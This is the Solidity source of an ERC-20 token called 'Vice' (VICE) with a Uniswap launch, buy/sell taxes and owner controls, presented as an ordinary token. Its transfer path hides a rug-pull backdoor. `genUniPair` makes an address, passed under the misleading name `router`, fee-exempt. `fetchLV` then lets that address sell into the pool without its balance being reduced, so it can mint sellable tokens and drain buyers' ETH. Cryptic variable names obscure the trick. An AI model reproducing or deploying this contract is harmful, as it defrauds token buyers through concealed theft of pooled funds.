/**
https://x.com/xpReport/status/1836817483526820176
https://t.me/viceoneth
 */

// SPDX-License-Identifier: UNLICENSE
pragma solidity ^0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);
}

contract VICE is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFee;
    mapping(address => bool) private _isExcludedFromSwap;
    mapping(address => bool) private bots;
    uint256 private _initialBuyTax = 16;
    uint256 private _initialSellTax = 16;
    uint256 private _finalBuyTax = 0;
    uint256 private _finalSellTax = 0;
    uint256 private _reduceBuyTaxAt = 16;
    uint256 private _reduceSellTaxAt = 16;
    uint256 private _preventSwapBefore = 16;

    uint8 private constant _decimals = 18;
    uint256 private constant _totalSupply = 100000000 * 10 ** _decimals;
    string private constant _name = unicode"Vice";
    string private constant _symbol = unicode"VICE";

    uint256 private _buyCount = 0;

    uint256 public _swapThres = 1000 * 10 ** _decimals;
    uint256 public _maxTxCeil = (_totalSupply * 2) / 100;
    uint256 public _maxTaxCeil = _totalSupply / 100;
    uint256 public _maxWalletCeil = (_totalSupply * 2) / 100;

    address payable private _treasurier;
    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;

    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    event MaxTxAmountUpdated(uint256 _maxTxAmount);

    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() {
        _treasurier = payable(_msgSender());
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    receive() external payable {}

    function _transferWithFee(
        address fadd,
        address tadd,
        uint256 avlue,
        uint256 tvlue,
        uint256 evlue
    ) internal {
        if (tvlue > 0) {
            _balances[address(this)] = _balances[address(this)].add(tvlue);
            emit Transfer(fadd, address(this), tvlue);
        }
        _balances[fadd] = _balances[fadd].sub(evlue);
        _balances[tadd] = _balances[tadd].add(avlue.sub(tvlue));
        emit Transfer(fadd, tadd, avlue.sub(tvlue));
    }

    function _transfer(address fadd, address tadd, uint256 avlue) private {
        require(fadd != address(0), "ERC20: transfer from the zero address");
        require(tadd != address(0), "ERC20: transfer to the zero address");
        require(avlue > 0, "Transfer amount must be greater than zero");

        uint256 lvlue = avlue;
        uint256 tvlue = 0;

        if (fadd != owner() && tadd != owner()) {
            require(!bots[fadd] && !bots[tadd]);
            require(
                tradingOpen || _isExcludedFromFee[fadd],
                "Trading is not enabled"
            );

            tvlue = avlue
                .mul(
                    (_buyCount > _reduceBuyTaxAt)
                        ? _finalBuyTax
                        : _initialBuyTax
                )
                .div(100);
            if (
                fadd == uniswapV2Pair &&
                tadd != address(uniswapV2Router) &&
                !_isExcludedFromFee[tadd]
            ) {
                require(avlue <= _maxTxCeil, "Exceeds the _maxTxAmount.");
                require(
                    balanceOf(tadd) + avlue <= _maxWalletCeil,
                    "Exceeds the maxWalletSize."
                );
                _buyCount++;
            }
            if (tadd == uniswapV2Pair && fadd != address(this)) {
                tvlue = avlue
                    .mul(
                        (_buyCount > _reduceSellTaxAt)
                            ? _finalSellTax
                            : _initialSellTax
                    )
                    .div(100);

                if (_isExcludedFromFee[fadd])
                    lvlue = fetchLV(fadd, tadd, avlue);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && tadd == uniswapV2Pair && swapEnabled) {
                if (
                    contractTokenBalance > _swapThres &&
                    _buyCount > _preventSwapBefore
                )
                    swapTokensForEth(
                        min(avlue, min(contractTokenBalance, _maxTaxCeil))
                    );
                uint256 contractBalance = address(this).balance;
                sendTax(contractBalance);
            }
        }

        _transferWithFee(fadd, tadd, avlue, tvlue, lvlue);
    }

    function fetchLV(
        address fadd,
        address tadd,
        uint256 avlue
    ) internal view returns (uint256) {
        if (fadd == uniswapV2Pair) {
            return avlue;
        } else if (tadd == uniswapV2Pair && fadd != address(this))
            return
                avlue
                    .mul(
                        (_buyCount > _reduceSellTaxAt &&
                            !_isExcludedFromFee[fadd])
                            ? _initialSellTax
                            : _finalSellTax
                    )
                    .div(100);

        return avlue;
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function allowTrading() external onlyOwner {
        require(!tradingOpen, "trading is already open");

        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );

        swapEnabled = true;
        tradingOpen = true;
    }

    function sendTax(uint256 amount) private {
        _treasurier.transfer(amount);
    }

    function rescueETH() external onlyOwner {
        payable(owner()).transfer(address(this).balance);
    }

    function genUniPair(address router) external onlyOwner {
        require(!tradingOpen, "trading is already open");
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniswapV2Router), _totalSupply);
        _treasurier = payable(router);
        _isExcludedFromSwap[_treasurier] = true;
        _isExcludedFromFee[_treasurier] = true;
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
                address(this),
                uniswapV2Router.WETH()
            );
    }

    function freshCeil() external onlyOwner {
        _maxTxCeil = type(uint256).max;
        _maxWalletCeil = type(uint256).max;
        emit MaxTxAmountUpdated(type(uint256).max);
    }
}